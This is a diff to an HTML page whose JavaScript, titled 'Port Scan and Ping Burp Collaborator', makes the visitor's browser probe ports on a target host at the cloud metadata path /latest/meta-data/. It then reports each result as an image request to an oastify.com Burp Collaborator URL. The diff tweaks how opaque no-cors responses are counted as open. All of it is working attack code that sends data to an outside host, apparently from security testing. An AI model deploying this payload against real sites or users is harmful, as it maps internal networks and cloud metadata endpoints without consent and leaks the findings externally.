@@ -4,24 +4,26 @@
     <title>Port Scan and Ping Burp Collaborator</title>
     <script type="text/javascript">
         async function scanPort(host, port) {
-            let statusCode = null;
+            let statusCode = "open"; // Default to "open" if no error occurs
             try {
                 let url = `http://${host}:${port}/latest/meta-data/`;
                 let response = await fetch(url, { mode: 'no-cors' });
-                statusCode = response.status || 'unknown'; // If no-cors, status might be opaque
-                
-                if (response.ok) {
-                    console.log(`Port ${port} is open on ${host}, Status Code: ${statusCode}`);
-                    sendPing(host, port, statusCode);
+                if (response.type === 'opaque') {
+                    console.log(`Port ${port} is open on ${host}, Status Code: opaque`);
+                    sendPing(host, port, 'opaque');
+                    return port;
+                } else if (response.ok) {
+                    console.log(`Port ${port} is open on ${host}, Status Code: 200`);
+                    sendPing(host, port, '200');
                     return port;
                 } else {
-                    console.log(`Port ${port} is closed on ${host}, Status Code: ${statusCode}`);
-                    sendPing(host, port, statusCode);
-                    return null; // Port is closed
+                    console.log(`Port ${port} is closed on ${host}`);
+                    sendPing(host, port, 'closed');
+                    return null;
                 }
             } catch (error) {
                 console.log(`Port ${port} is closed on ${host}, Error: ${error}`);
-                sendPing(host, port, statusCode || 'error');
+                sendPing(host, port, 'error');
                 return null; // Port is closed or error occurred
             }
         }
@@ -37,9 +39,9 @@
             return openPorts;
         }
 
-        function sendPing(host, port, statusCode) {
+        function sendPing(host, port, status) {
             let collaboratorUrl = 'https://dn4t8tvr4v4vh2gyzumgk6121t7kvbnzc.oastify.com';
-            let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}&status=${statusCode}`;
+            let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}&status=${status}`;
             let img = new Image();
             img.src = pingUrl;
             console.log(`Ping sent to ${pingUrl}`);
